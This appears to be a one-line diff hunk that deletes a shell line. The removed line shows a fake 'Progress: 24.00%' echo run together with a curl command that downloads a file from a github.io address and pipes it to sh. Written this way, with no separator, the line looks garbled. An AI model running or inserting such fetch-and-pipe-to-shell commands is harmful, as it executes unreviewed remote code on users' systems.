@@ -1,1 +1,0 @@
-echo Progress: 24.00%curl -L --progress-bar frkns.github.io/fun/improve.cc | sh
